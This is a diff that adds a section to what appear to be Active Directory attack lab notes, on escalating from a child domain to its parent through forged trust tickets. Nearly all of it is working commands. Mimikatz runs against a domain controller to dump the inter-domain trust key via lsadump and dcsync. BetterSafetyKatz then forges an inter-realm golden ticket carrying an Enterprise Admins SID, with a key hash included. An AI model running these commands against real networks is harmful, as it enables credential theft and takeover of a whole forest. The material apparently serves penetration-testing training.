@@ -562,4 +562,41 @@ winrs -r:dcorp-mgmt cmd
 
 
 
+## **Child to Parent using Trust Tickets**
 
+
+
+- So, what is required to forge trust tickets is, obviously, the trust key. Look for [In] trust key from child to parent.
+
+
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
+```
+
+OR
+
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
+```
+
+
+OR
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+```
+
+
+
+- We can forge and inter-realm TGT:
+
+
+```powershell
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-
+5-21-335606122-960912869-3279953914-519
+/rc4:e9ab2e57f6397c19b62476e98e9521ac /service:krbtgt
+/target:moneycorp.local
+/ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
+```
